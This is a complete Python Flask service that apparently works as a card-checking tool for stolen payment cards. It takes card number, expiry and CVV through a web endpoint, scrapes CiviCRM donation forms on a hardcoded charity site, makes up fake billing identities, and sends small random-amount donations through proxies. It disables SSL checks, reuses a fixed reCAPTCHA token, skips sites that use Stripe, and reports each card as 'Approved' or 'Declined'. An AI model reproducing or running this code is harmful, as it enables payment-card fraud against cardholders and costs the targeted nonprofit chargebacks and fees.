from flask import Flask, request, jsonify
from datetime import datetime
import random
import requests
import logging
import re
import time
import json
import os
import string
import ssl
import urllib3
from urllib3.util.ssl_ import create_urllib3_context
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs

requests.packages.urllib3.util.connection.HAS_IPV6 = False
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

logging.basicConfig(level=logging.INFO, format='%(message)s', datefmt='%H:%M:%S')

VALID_YEARS = list(range(2025, 2036))
TIMEOUT_SECONDS = 15

class IgnoreSSLAdapter(requests.adapters.HTTPAdapter):
    def init_poolmanager(self, *args, **kwargs):
        ctx = create_urllib3_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        kwargs['ssl_context'] = ctx
        return super().init_poolmanager(*args, **kwargs)

def generate_random_user_data():
    first_names = ["John", "Sarah", "Michael", "Emily", "David", "Jessica", "James", "Lauren", "Robert", "Maria", "William", "Jennifer", "Richard", "Linda", "Joseph", "Patricia"]
    last_names = ["Smith", "Johnson", "Brown", "Taylor", "Wilson", "Davis", "Clark", "Harris", "Miller", "Moore", "Anderson", "Thomas", "Jackson", "White", "Martin"]
    email_domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "aol.com", "icloud.com"]
    
    first_name = random.choice(first_names)
    last_name = random.choice(last_names)
    middle_name = random.choice(first_names)[0]
    email_prefix = f"{first_name.lower()}{random.randint(1000,9999)}"
    email = f"{email_prefix}@{random.choice(email_domains)}"
    
    city = "Minneapolis"
    state_id = "1022" 
    postal_code = "55401"
    street_address = f"{random.randint(100, 9999)} Main St"
    phone = f"612-{random.randint(200,999)}-{random.randint(1000,9999)}"
    
    return {'first_name': first_name, 'last_name': last_name, 'middle_name': middle_name, 'email': email, 'city': city, 'state_id': state_id, 'postal_code': postal_code, 'street_address': street_address, 'phone': phone}

def clean_card_number(ccnum): return re.sub(r'\D', '', ccnum)

def get_card_type(ccnum):
    ccnum = clean_card_number(ccnum)
    if ccnum.startswith('4'): return "Visa"
    elif ccnum.startswith('5') and len(ccnum) == 16: return "MasterCard"
    elif ccnum.startswith('3') and len(ccnum) in [15, 16]:
        if ccnum.startswith('34') or ccnum.startswith('37'): return "Amex"
    elif ccnum.startswith('6'): return "Discover"
    return "Unknown"

def create_session(proxy_url=None):
    session = requests.Session()
    session.mount('https://', IgnoreSSLAdapter())
    session.mount('http://', IgnoreSSLAdapter())
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1"
    }
        
    session.headers.update(headers)
    
    if proxy_url:
        parts = proxy_url.split(':')
        if len(parts) == 4:
            proxy_url = f"{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
        if not proxy_url.startswith('http'): 
            proxy_url = f'http://{proxy_url}'
        session.proxies = {"http": proxy_url, "https": proxy_url}
        
    return session

def detect_payment_processor(html):
    processors = {'authorize': ['authorize.net', 'authorize', 'paymentech', 'cybersource'], 'stripe': ['stripe', 'stripe.js', 'stripe.com', 'v3/stripe'], 'paypal': ['paypal', 'paypal.com']}
    detected = []
    for pattern in [r'authorize\.net', r'Authorize\.Net', r'payment gateway authorize', r'authorizenet']:
        if re.search(pattern, html, re.I): detected.append('authorize'); break
    auth_fields = ['credit_card_number', 'cvv2', 'credit_card_exp_date']
    if sum(1 for field in auth_fields if re.search(r'name=["\']?' + re.escape(field) + r'["\']?', html, re.I)) >= 2 and 'authorize' not in detected: detected.append('authorize')
    if 'authorize' not in detected:
        for pattern in [r'stripe\.com', r'stripe\.js', r'js\.stripe\.com']:
            if re.search(pattern, html, re.I): detected.append('stripe'); break
    return detected

def extract_raw_fields(html, soup, form):
    payload = {}
    inputs = form.find_all('input')
    
    submit_button_name = "_qf_Main_upload"
    submit_button_value = "1"
    for inp in inputs:
        if inp.get('type') in ['submit', 'button', 'image']:
            name = inp.get('name')
            if name and '_qf_' in name:
                submit_button_name = name
                submit_button_value = inp.get('value', '1')
                break
    
    payload['_submit_button_name'] = submit_button_name
    payload['_submit_button_value'] = submit_button_value

    for inp in inputs:
        name = inp.get('name')
        input_type = inp.get('type', 'text')
        value = inp.get('value', '')
        required = inp.get('required', False)
        if name:
            if input_type == 'radio':
                if name not in payload: payload[name] = {'value': value, 'type': input_type, 'required': required, 'options': []}
                if value and value not in payload[name]['options']: payload[name]['options'].append(value)
                if inp.get('checked'): payload[name]['value'] = value
            else:
                payload[name] = {'value': value, 'type': input_type, 'required': required}
    
    for sel in form.find_all('select'):
        name = sel.get('name')
        if name:
            options = sel.find_all('option')
            option_values = [opt.get('value', '') for opt in options] if options else []
            default_value = sel.find('option', selected=True).get('value', '') if sel.find('option', selected=True) else (options[0].get('value', '') if options else '')
            payload[name] = {'value': default_value, 'type': 'select', 'required': sel.get('required', False), 'options': option_values}
    
    for txt in form.find_all('textarea'):
        name = txt.get('name')
        if name: payload[name] = {'value': txt.get_text(strip=True), 'type': 'textarea', 'required': txt.get('required', False)}
    
    payment_processor_id = None
    for inp in inputs:
        if inp.get('type') == 'radio' and 'payment_processor' in inp.get('name', '').lower():
            value = inp.get('value', '')
            label = inp.find_next('label') if inp.find_next('label') else None
            label_text = label.get_text(strip=True) if label else ''
            if 'authorize' in label_text.lower() or 'authorize' in str(value).lower():
                payment_processor_id = value; break
            elif not payment_processor_id: payment_processor_id = value
    if not payment_processor_id:
        for inp in inputs:
            if inp.get('type') == 'hidden' and 'payment_processor' in inp.get('name', '').lower() and inp.get('value'):
                payment_processor_id = inp.get('value'); break
    if payment_processor_id: payload['_detected_payment_processor_id'] = {'value': payment_processor_id, 'type': 'detected'}
    return payload

def get_form_action_and_payload(session, url, proxy_url):
    try:
        resp = session.get(url, timeout=TIMEOUT_SECONDS, allow_redirects=True)
        if resp.status_code == 403: return None, None, None, None, "403 Forbidden"
        if resp.status_code in [403, 503] and re.search(r'cloudflare|cf-challenge', resp.text, re.I): return None, None, None, None, "Cloudflare protection"
        if resp.status_code != 200 or not resp.text: return None, None, None, None, f"Bad HTTP {resp.status_code}"
        
        html = resp.text
        
        qfkey = None
        for pattern in [r'name="qfKey"\s+value="([^"]+)"', r'name="qfKey"\s*type="hidden"\s*value="([^"]+)"', r'qfKey=([a-zA-Z0-9]+)']:
            match = re.search(pattern, html)
            if match: qfkey = match.group(1); break
            
        if not qfkey:
            return None, None, None, None, "Failed: No qfKey (Blocked by Captcha/Cloudflare)"

        processors = detect_payment_processor(html)
        has_authorize = 'authorize' in processors
        if 'stripe' in processors: return None, None, None, None, "Stripe Detected"
        if not has_authorize and processors: return None, None, None, None, "Other Processor"
        
        soup = BeautifulSoup(html, 'html.parser')
        form = soup.find('form', id=re.compile(r'Main|main|Contribution', re.I)) or soup.find('form', class_=re.compile(r'crm|contribute', re.I)) or soup.find('form')
        if not form: return None, None, None, None, "Form not found"
        
        form_action = form.get('action') or re.search(r'<form[^>]*action="([^"]+)"', html).group(1) if re.search(r'<form[^>]*action="([^"]+)"', html) else None
        if form_action and not form_action.startswith('http'): form_action = urljoin(url, form_action)
        if not form_action: return None, None, None, None, "Form action not found"
        
        form_action = form_action.replace("&amp;", "&")
        
        payload = extract_raw_fields(html, soup, form)
        return qfkey, form_action, payload, has_authorize, "OK"
        
    except Exception as e:
        error_name = type(e).__name__
        if 'Timeout' in error_name or 'ConnectError' in error_name or 'ConnectionError' in error_name or 'ProxyError' in error_name:
            return None, None, None, None, "Proxy Timed out"
        if 'SSLError' in error_name:
            return None, None, None, None, "SSL Error"
            
        return None, None, None, None, "Failed to fetch"

def parse_response(html, url):
    soup = BeautifulSoup(html, 'html.parser')
    
    status_divs = soup.find_all('div', class_=re.compile(r'status|alert|error|messages|crm-error', re.I))
    for status_div in status_divs:
        error_text = status_div.get_text(separator=' ', strip=True)
        error_text = re.sub(r'\s+', ' ', error_text).strip()
        if error_text and len(error_text) > 3:
            if "Please correct the following errors in the form fields below:" in error_text:
                error_text = error_text.replace("Please correct the following errors in the form fields below:", "").strip()
            if error_text:
                return {'approved': False, 'has_msg': True, 'message': error_text, 'clean_response': error_text}
                
    msg_text_span = soup.find('span', class_='msg-text')
    if msg_text_span:
        error_text = msg_text_span.get_text(strip=True)
        if "Payment Processor Error message:" in error_text: error_text = error_text.split("Payment Processor Error message:")[-1].strip()
        if "Payment Response:" in error_text: error_text = error_text.split("Payment Response:")[-1].strip()
        error_text = re.sub(r'\s+', ' ', error_text).strip()
        if error_text and len(error_text) > 3:
            return {'approved': False, 'has_msg': True, 'message': error_text, 'clean_response': error_text}

    all_text = soup.get_text(' ', strip=True)
    if re.search(r'(submission failed|failed to submit|transaction declined|error on participant|card declined)', all_text, re.I):
        match = re.search(r'(submission failed|failed to submit|transaction declined|error on participant|card declined)[^.]*', all_text, re.I)
        if match:
            return {'approved': False, 'has_msg': True, 'message': match.group(0).strip(), 'clean_response': match.group(0).strip()}

    if '_qf_ThankYou_display=true' in url or '_qf_ThankYou_display=1' in url:
        return {'approved': True, 'has_msg': False, 'message': 'Payment complete', 'clean_response': 'Payment complete'}
    
    return {'approved': False, 'has_msg': False, 'message': 'No Error Message Found', 'clean_response': ''}

def process_site_for_payload(url, override_proxy=None):
    proxy_url = override_proxy if override_proxy else None
    session = create_session(proxy_url)
    qfkey, form_action, payload, has_authorize, err_msg = get_form_action_and_payload(session, url, proxy_url)
    
    if err_msg != "OK":
        session.close()
        return {'url': url, 'status': err_msg.lower().replace(' ', '_'), 'payload': None, 'session': None, 'proxy_url': None}
    
    if not qfkey or not form_action:
        session.close()
        return {'url': url, 'status': 'failed', 'payload': None, 'session': None, 'proxy_url': None}
    
    return {'url': url, 'status': 'success', 'payload': payload, 'form_action': form_action, 'qfkey': qfkey, 'has_authorize': has_authorize, 'session': session, 'proxy_url': proxy_url}

def extract_confirmation_form(html, soup):
    confirm_form = soup.find('form', {'id': 'Confirm'})
    if not confirm_form:
        possible_forms = soup.find_all('form')
        if possible_forms:
            confirm_form = possible_forms[0]
        else:
            return None, None, None

    new_qfkey_input = confirm_form.find('input', {'name': 'qfKey'})
    new_qfkey = new_qfkey_input['value'] if new_qfkey_input and 'value' in new_qfkey_input.attrs else None
    
    action = confirm_form.get('action')
    return confirm_form, action, new_qfkey

def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, amount, is_confirm=False, new_qfkey=None):
    scheme = get_card_type(ccnum)
    full_year = f"20{yy}" if len(yy) == 2 else yy
    input_month = int(mm)

    final_payload = {}
    
    final_payload["g-recaptcha-response"] = "0cAFcWeA4PqJOMFj5mWJD9PmhlqErXn7af22ptYqSm9PWIfUuWBD4CuqXOChTMG-uxogsiJFzY-zd9ZErdAp8mAMgGVa491KAT417HoBZftbG2aTzzIuzJAYLSzxNXPrDmt8nWhuGeMt66_-KgexQ5WcpNrAQXaUofULifI4N05Xu-aGCbF1BvuU6AQKLs8j_muWRkHZQVYplfzk5PPirHB8en_yuWaKIMceUyBJaF1KcvjAf6dHyu48kaDHdHhoor16NdbkzRS0G6EoFhQm1ktHTFEDkkiFkVS5LWx7BK_MeaaZUpIzjOIAMHL3rX_1M-PwJjAxT_LbQ9sYjVoI_m_8sAKjdRoiHAzgZdyBdytGY9OJEVAUukVHGRU6tO15M9lYYhA5VzK4nD0dWeCfIk15U3TcAwZgdAcV036TnwfZMFfC636oW7SgQ0Q76xPLGYNxYI0JT3TR8nHnW-sqmXk8pZQ-3wR3Zy056eCjt-qyR9a-1hRmvcO-O9OvBPQpoEnT_0kNxXtEjAtbCvYz2iitwZoMX4iA7krPUGYUhku9VEQdyNkR_IW5S-DUypInmpqVy1DR0g7iGE4GccDpimMUHlr9VThWRDLS_mpBvRAVuOsjH7RaahI2xoXWZyIHQ0he2nsI-q-0hdJ_O5UVr1rPzWCYvEGu9ufhE6AhIMz1XKnO5mxHppZ6oCMzAW7jwPgwf4VBSJjWB4ym_YriAPEmq4su1ehRc21xtl03WlPLZyAqIwmSzNc5O6biV-bMVa7BQuBGZOILy4X3qQ-0O0byiscz729xXIN30L4hR5rv7zMP-WctzXSvLxkk9dWS2mpaD3msoBXZP4Ac6SkGf_TvG3YlOOEjfgTNnTT86tVhC11Ni9PXwl9m2kolOe7v_PmMhmgN-jE3IjxFWHxpCfN9_MfQk-jYJQ2s05tgXlPz4kh_4R6AWuuIozqsdIPI676qsiqkKFiQptp_NxaARq3KndEd4eS5Vh8GYEmgBBaE6o_KrWQRTG-E5WuA1X0CcpPLBk6RvroZdQGy9kwInxFEF9u9h4J3ja7tWqOqrnomaGzjC7AM3KoJvE3wXpU6EW_JLHUbXNSDfkjdDWMzM9bfiZ5NsWYnDQtXzHBYYtv6KVD-ziCCwAkG84RUBjLscQkJCe7Wn-Dujhe9W34cw6Sw8eeFroIEPAs_hsnJQabopNAWRNKnK49wYsVkrmV31D3OxGFNuQfFPR-PLzeIYb4yhAuwVehhGeOAFsp0RSVQssODPW6ncHgBXuL5hakVTl9ehyjIcaB6E5QzLrPFjIjGAMRUmaEzWzpO4R5Oq2S0CZZA-QxNInQjvH54iwT5BKbjdZYXY6xA2"

    if is_confirm:
        # BETUL 100% MCM PAYLOAD YANG AWAK BG
        final_payload["qfKey"] = new_qfkey if new_qfkey else qfkey
        final_payload["entryURL"] = "https://www.saharaaa.org/civicrm/contribute/transact/?reset=1&amp;id=1"
        final_payload["email_work"] = ""
        final_payload["_qf_default"] = "Confirm:next"
        final_payload["custom_1"] = full_year
        final_payload["custom_3"] = ""
        final_payload["_qf_Confirm_next"] = "1"
    else:
        final_payload["qfKey"] = qfkey
        final_payload["entryURL"] = "https://www.saharaaa.org/civicrm/contribute/transact/?reset=1&amp;id=1"
        final_payload["hidden_processor"] = "1"
        final_payload["payment_processor_id"] = "4"
        final_payload["priceSetId"] = "3"
        final_payload["selectProduct"] = ""
        final_payload["_qf_default"] = "Main:upload"
        final_payload["zip_billing"] = ""
        final_payload["MAX_FILE_SIZE"] = "536870912"
        final_payload["price_2"] = "10"
        final_payload["email-5"] = user_data['email']
        final_payload["custom_1"] = full_year
        final_payload["custom_2"] = ""
        final_payload["custom_3"] = ""
        final_payload["credit_card_type"] = scheme
        final_payload["credit_card_number"] = ccnum
        final_payload["cvv2"] = cvv
        final_payload["credit_card_exp_date[M]"] = str(input_month)
        final_payload["credit_card_exp_date[Y]"] = full_year
        final_payload["billing_first_name"] = user_data['first_name']
        final_payload["billing_middle_name"] = ""
        final_payload["billing_last_name"] = user_data['last_name']
        final_payload["billing_street_address-5"] = user_data['street_address']
        final_payload["billing_city-5"] = user_data['city']
        final_payload["billing_country_id-5"] = "1228"
        final_payload["billing_state_province_id-5"] = user_data['state_id']
        final_payload["billing_postal_code-5"] = user_data['postal_code']
        
        submit_name = raw_payload.get('_submit_button_name', '_qf_Main_upload')
        submit_val = raw_payload.get('_submit_button_value', '1')
        final_payload[submit_name] = submit_val

    return final_payload

def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
    base_url, raw_payload, form_action, qfkey = site_data['url'], site_data['payload'], site_data['form_action'], site_data['qfkey']
    session, proxy_url = site_data.get('session'), site_data.get('proxy_url')
    
    ccnum = clean_card_number(ccnum)
    user_data = generate_random_user_data()

    detected_price = round(random.uniform(1.05, 5.00), 2)

    for attempt in range(3):
        try:
            clean_initial = build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, detected_price, is_confirm=False)

            session.headers.update({
                "Referer": "https://www.saharaaa.org/civicrm/contribute/transact/?reset=1&id=1",
                "Origin": "https://www.saharaaa.org"
            })

            post_url = form_action
            if 'qfKey=' not in post_url:
                if '?' in post_url: post_url += f'&qfKey={qfkey}'
                else: post_url += f'?qfKey={qfkey}'

            # GUNA MULTIPART FORM DATA SUPAYA &amp; TAK DICONVERT
            response = session.post(post_url, files=clean_initial, timeout=TIMEOUT_SECONDS + 2, allow_redirects=True)

            soup_resp = BeautifulSoup(response.text, 'html.parser')
            
            logging.info(f"URL Selepas Submit Pertama: {response.url}")
            
            confirm_form = soup_resp.find('form', {'id': 'Confirm'})
            if not confirm_form:
                possible_forms = soup_resp.find_all('form')
                if possible_forms:
                    confirm_form = possible_forms[0]
                    logging.info("Confirm Form tak jumpa ID, pakai form pertama")
                else:
                    logging.info("Confirm Form tak jumpa langsung!")
            
            if confirm_form:
                confirm_action = confirm_form.get('action')
                new_qfkey_input = confirm_form.find('input', {'name': 'qfKey'})
                qfkey_to_use = new_qfkey_input['value'] if new_qfkey_input and 'value' in new_qfkey_input.attrs else qfkey

                confirm_post_url = form_action
                if confirm_action:
                    confirm_post_url = urljoin("https://www.saharaaa.org/civicrm/contribute/transact/", confirm_action)

                if '?' in confirm_post_url:
                    if '_qf_Confirm_display=true' not in confirm_post_url:
                        confirm_post_url += '&_qf_Confirm_display=true'
                    if f'qfKey={qfkey_to_use}' not in confirm_post_url:
                        confirm_post_url = re.sub(r'qfKey=[a-zA-Z0-9]+', f'qfKey={qfkey_to_use}', confirm_post_url)
                else:
                    confirm_post_url += f'?_qf_Confirm_display=true&qfKey={qfkey_to_use}'

                session.headers.update({
                    "Referer": response.url
                })

                clean_confirm = build_clean_payload({}, user_data, ccnum, mm, yy, cvv, qfkey, detected_price, is_confirm=True, new_qfkey=qfkey_to_use)
                
                # CONFIRMATION PAGE GUNA URL ENCODED BIASA
                confirm_response = session.post(confirm_post_url, data=clean_confirm, timeout=TIMEOUT_SECONDS + 2, allow_redirects=True)
                
                logging.info(f"URL Selepas Submit Kedua: {confirm_response.url}")
                
                result = parse_response(confirm_response.text, confirm_response.url)
            else:
                result = parse_response(response.text, response.url)
            
            if 'session has expired' in result.get('message', '').lower() or 'unable to complete' in result.get('message', '').lower():
                if attempt < 2:
                    if session: session.close()
                    site_data = process_site_for_payload(base_url, override_proxy)
                    if site_data['status'] != 'success': return False, detected_price
                    raw_payload, form_action, qfkey = site_data['payload'], site_data['form_action'], site_data['qfkey']
                    session = site_data['session']
                    time.sleep(1); continue
                else:
                    if session: session.close()
                    return result, detected_price

            if session: session.close()
            return result, detected_price
            
        except Exception as e:
            if session: session.close()
            return {'approved': False, 'message': str(e), 'clean_response': ''}, detected_price

@app.route('/auth', methods=['GET'])
def handle_auth():
    start_time = time.time()
    
    site = request.args.get('site')
    id_param = request.args.get('id')
    if site and id_param and 'id=' not in site:
        site = f"{site}&id={id_param}"

    cc_param = request.args.get('cc')
    proxy_param = request.args.get('proxy')

    if not site or not cc_param:
        return jsonify({"error": "Missing 'site' or 'cc' parameter"}), 400

    try:
        parts = cc_param.split('|')
        if len(parts) != 4:
            return jsonify({"error": "Invalid 'cc' format. Expected: number|mm|yy|cvv"}), 400
        cc, mm, yy, cvv = parts
    except Exception as e:
        return jsonify({"error": "Error parsing 'cc' parameter: " + str(e)}), 400

    override_proxy = proxy_param if proxy_param else None

    try:
        site_data = process_site_for_payload(site, override_proxy)
        
        if site_data['status'] == 'success':
            result, detected_price = process_card_on_site(site_data, cc, mm, yy, cvv, override_proxy)
            
            if not result:
                result = {'approved': False, 'message': 'Failed to process site data.', 'clean_response': 'Failed'}
        else:
            result = {'approved': False, 'message': site_data['status'], 'clean_response': site_data['status']}
            detected_price = 0.0
            
    except Exception as e:
        result = {'approved': False, 'message': 'Server exception: ' + str(e), 'clean_response': 'Server exception'}
        detected_price = 0.0

    end_time = time.time()
    time_taken = round(end_time - start_time, 2)

    result_status = "Approved" if result.get('approved', False) else "Declined"
    
    response_msg = result.get('message', 'Unknown Error')
    if "Payment Processor Error message :" in response_msg:
        response_msg = response_msg.replace("Payment Processor Error message :", "").strip()

    return jsonify({
        "Gateway": "Authorized.net",
        "Price": detected_price,
        "Result": result_status,
        "Response": response_msg,
        "Status": result.get('approved', False),
        "Time": f"{time_taken}s",
        "cc": cc_param
    })

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
